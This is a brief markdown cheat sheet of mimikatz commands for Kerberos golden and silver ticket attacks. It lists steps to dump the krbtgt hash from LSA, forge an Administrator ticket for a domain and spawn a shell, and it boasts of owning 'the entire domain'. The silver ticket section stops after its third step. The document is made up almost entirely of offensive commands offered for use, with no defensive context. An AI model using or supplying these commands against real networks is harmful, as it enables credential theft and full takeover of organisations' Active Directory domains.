# GOLDEN TICKET

## Dump krbtgt hash to own the entire domain!

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:krbtgt

#### 4) kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:NTLM HASH /id:500(Admin) or 1103(Service)

#### 5) misc::cmd

# SILVER TICKET

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN
